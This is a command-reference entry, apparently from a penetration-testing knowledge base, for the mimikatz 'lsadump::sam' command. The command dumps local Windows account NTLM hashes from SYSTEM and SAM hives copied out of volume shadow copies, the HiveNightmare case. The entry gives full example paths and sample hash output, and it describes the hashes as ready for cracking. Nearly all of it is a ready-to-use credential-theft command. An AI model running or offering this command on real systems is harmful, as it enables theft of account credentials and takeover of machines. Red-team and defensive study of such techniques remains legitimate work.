---
id: 4f11ae41-f634-444e-9b0a-ca92d134280d
name: mimikatz-lsadump-sam-from-shadowcopy
type: command
executor: cmd
data: 'mimikatz> lsadump::sam /system:$_SYSTEM_PATH /sam:$_SAM_PATH'
output: null
created_at: '2023-04-06T03:56:28.851575+00:00'
updated_at: '2023-04-10T20:37:52.895105+00:00'
platforms:
  - Windows
tags:
  - sam-dump
  - hashes
verified: true
validated: true
---

# mimikatz-lsadump-sam-from-shadowcopy

## Command

```cmd
mimikatz> lsadump::sam /system:$_SYSTEM_PATH /sam:$_SAM_PATH
```

## Description

Dumps local account hashes from the SAM database using paths to SYSTEM and SAM files, typically from shadow copies. Bypasses live system protections in HiveNightmare scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /system:$_SYSTEM_PATH | Path to SYSTEM hive (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM) | Yes |
| /sam:$_SAM_PATH | Path to SAM hive (e.g., similar but for SAM) | Yes |

## Examples

### Basic Usage

```cmd
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

## Expected Output

```
User : Administrator
RID  : 000001f4 (500)
User : Guest
...
Hash NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Lists users and their NTLM hashes for cracking.

## Related

- [[procedures/HiveNightmare-SAM-Dump-via-Shadow-Copies]]
